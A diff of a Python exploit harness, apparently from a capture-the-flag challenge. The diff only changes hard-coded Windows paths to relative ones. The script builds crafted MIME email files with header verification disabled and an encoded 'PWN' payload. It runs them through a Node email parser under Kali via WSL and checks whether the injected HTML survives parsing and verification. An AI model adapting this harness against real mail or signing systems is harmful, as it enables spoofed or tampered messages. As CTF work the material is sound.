@@ -9,14 +9,14 @@
    LF-only payloads are fine.
 """
 import base64, subprocess, os, sys, json, re
-sys.path.insert(0, r'D:\ctf-index')
+sys.path.insert(0, r'.')
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email._policybase import Policy as _P
 _P.verify_generated_headers = False
 from _z_496_spec import PWN, BODY
 
-EML = r'D:\ctf-index\_z_496_emls'
+EML = r'./_z_496_emls'
 WSL = lambda cmd: subprocess.run(['wsl', '-d', 'kali-linux', '--', 'bash', '-lc', cmd],
                                  capture_output=True, text=True)
 def w(p):
@@ -25,7 +25,7 @@ def w(p):
 
 B1 = '=' * 15 + '177054127016892602' + '=='
 b64p = base64.b64encode(PWN.encode()).decode()
-TEMPLATE = open(r'D:\ctf-index\_z_496\template.jinja2').read()
+TEMPLATE = open(r'./_z_496\template.jinja2').read()
 
 
 def mk_D(lead):
@@ -71,7 +71,7 @@ def run(lead, tag):
     p_rep = os.path.join(EML, 'reply_%s.eml' % tag)
     open(p_rep, 'w', newline='', encoding='utf-8').write(reply)
 
-    r = WSL('node /mnt/d/ctf-index/_z_496_parse.js %s' % w(p_rep))
+    r = WSL('node ./_z_496_parse.js %s' % w(p_rep))
     try:
         j = json.loads(r.stdout)
         print('  TOP: html truthy=%s  html[:60]=%r' % (bool(j.get('html')), (j.get('html') or '')[:60]))
@@ -81,7 +81,7 @@ def run(lead, tag):
             % (w(p_rep), w(p_rep + '.out')))
     print('  verify:', [l for l in r.stdout.splitlines() if l.startswith('RC=') or 'CMS' in l or 'error' in l.lower()][:3])
     if 'RC=0' in r.stdout:
-        r2 = WSL('node /mnt/d/ctf-index/_z_496_parse.js %s' % w(p_rep + '.out'))
+        r2 = WSL('node ./_z_496_parse.js %s' % w(p_rep + '.out'))
         try:
             j2 = json.loads(r2.stdout)
             print('  VERIFIED: html == PWN:', j2.get('html') == PWN)
